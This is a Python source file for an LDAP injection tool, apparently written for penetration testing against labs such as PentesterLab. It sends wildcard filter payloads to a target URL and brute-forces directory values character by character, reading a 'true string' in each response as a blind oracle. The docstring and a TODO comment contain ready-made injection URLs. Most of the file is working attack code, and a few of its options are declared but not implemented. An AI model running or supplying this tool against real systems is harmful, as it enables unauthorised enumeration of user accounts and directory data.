"""
Examples:

ldap-dumper.py --brute-s --true-string=AUTHENTICATED 'http://vulnerable/ldap/example2.php?name=%s)(name=*))%%00&password='

In this example, we inserted an expression into the param that will always return true if the parameter replaced by %s is true. In this case it will ennumerate all the valid users.

Your mission is to get an LDAP that will return --true-string when TRUE, and will not return it when FALSE.

Remember to quote the URL! And also remember that % needs to be escaped as %%, particularly important for URL encoded strings. Also, some strings in LDAP are DN strings, which do not support wildcards.

Plase see for more info:

https://www.owasp.org/index.php/LDAP_injection
http://web-for-pentester.pentesterlab.com/examples_of_web_vulnerabilities/ldap_attacks/
https://code.google.com/p/ldap-blind-explorer/
http://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf
http://www.ietf.org/rfc/rfc1960.txt
"""

import argparse, logging, string, requests

def set_logging():
    requests_log = logging.getLogger("requests")
    logging.basicConfig(level=logging.DEBUG)

def brute_char(base_url, charset, true_string, prefix):
    valid = []
    for c in charset:
        inj = "%s%s*" % (prefix, c)
        url = base_url % inj
        logging.debug(url)
        response = requests.get(url)
        if true_string in response.text:
            valid.append(c)

    return valid

# TODO implement
# GET 'http://vulnerable/ldap/example2.php?name=admin)(cn=a*)(cn=b*)(cn=c*)(cn=d*)(cn=e*)(cn=f*)(cn=g*)(cn=h*)(cn=i*)(cn=j*)(cn=k*)(cn=l*)(cn=m*)(cn=n*)(cn=o*)(cn=p*)(cn=q*)(cn=r*)(cn=s*)(cn=t*)(cn=u*)(cn=v*)(cn=w*)(cn=x*)(cn=y*)(cn=z*)(cn=A*)(cn=B*)(cn=C*)(cn=D*)(cn=E*)(cn=F*)(cn=G*)(cn=H*)(cn=I*)(cn=J*)(cn=K*)(cn=L*)(cn=M*)(cn=N*)(cn=O*)(cn=P*)(cn=Q*)(cn=R*)(cn=S*)(cn=T*)(cn=U*)(cn=V*)(cn=W*)(cn=X*)(cn=Y*)(cn=Z*)(cn=0*)(cn=1*)(cn=2*)(cn=3*)(cn=4*)(cn=5*)(cn=6*)(cn=7*)(cn=8*)(cn=9*)(cn=*))%00&password='
# kind of improvement and add support for non-wildcard stuff
def brute(base_url, true_string):
    logging.info("Entering brute mode for URL '%s'." % base_url)
    charset = string.ascii_lowercase + string.digits
    logging.debug("Going to brute with chars %s" % charset)

    # Check which ones were positive.
    exist = []
    first = True
    while True:
        if first == True:
            first = False
            exist = brute_char(base_url, charset, true_string,  "")
            logging.info("Valid initial values found, %s", exist)
        else:
            new_exist = []
            finished = True
            for poss in exist:
                valid_continuations = brute_char(base_url, charset, true_string, poss)
                if valid_continuations:
                    for v in valid_continuations:
                        finished = False
                        new_exist.append(poss + v)
                else:
                    new_exist.append(poss)

            if finished :
                break
            else :
                exist = new_exist

    return exist

def succ(result):
    print("Valid values found:")
    print("")
    for r in result:
        print(r)

if __name__ == '__main__':

    parser = argparse.ArgumentParser(description="""Grabs a vulnerable LDAP
        injection and tests for it. Once there, it can do serveral things, like
        blind getting values.""")
    parser.add_argument('URL', help="""The URL that is vulnerable to LDAP
        injection, with a %%s where the injection is. Please see the __doc__ string
        for more details.""")
    #parser.add_argument('--brute-s', help="""If this is set to true, then %%s
        #will be replaced with a, b, c and will bruteforce.""", action='store_true')
    parser.add_argument('TRUE_STRING', help="""A string that appears in the
        response if LDAP says True. If string doesnt appear, false is assumed.""")
    parser.add_argument('--max-path-size', help="""For bruteforcing DN names, which don't support wildcards, we create massive filters like (!(val=value1)(val=value2))[...] to be more efficient
    in our bruteforcing. This defines how long requests will be.""")
    parser.add_argument('--no-wildcard', '-N', help="""Some LDAP values do not
        honor the wildcard. These need to be bruteforced without a wildcard, which
        is much slower.""", action="store_true")

    args = parser.parse_args()

    logging.debug(args)

    set_logging()

    valid_values = brute(args.URL, args.TRUE_STRING)

    succ(valid_values)

